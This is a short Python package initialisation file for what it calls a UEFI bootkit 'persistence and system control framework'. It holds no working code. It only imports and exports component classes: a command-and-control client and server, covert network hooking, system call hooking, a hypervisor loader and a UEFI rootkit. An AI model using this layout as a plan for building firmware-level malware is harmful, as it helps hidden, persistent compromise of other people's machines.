"""
UEFI Bootkit Module
Comprehensive UEFI-based persistence and system control framework
"""

from .c2_client import C2Client
from .c2_server import C2Server
from .covert_network_hooking import CovertNetworkHooking
from .hooking_system_calls import SystemCallHooker
from .hypervisor_loading import HypervisorLoader
from .minimal_hypervisor import MinimalHypervisor
from .uefi_boot_loader import UEFIBootLoader
from .uefi_rootkit import UEFIRootkit

__all__ = [
    'C2Client',
    'C2Server',
    'CovertNetworkHooking',
    'SystemCallHooker',
    'HypervisorLoader',
    'MinimalHypervisor',
    'UEFIBootLoader',
    'UEFIRootkit',
]

__version__ = '1.0.0'
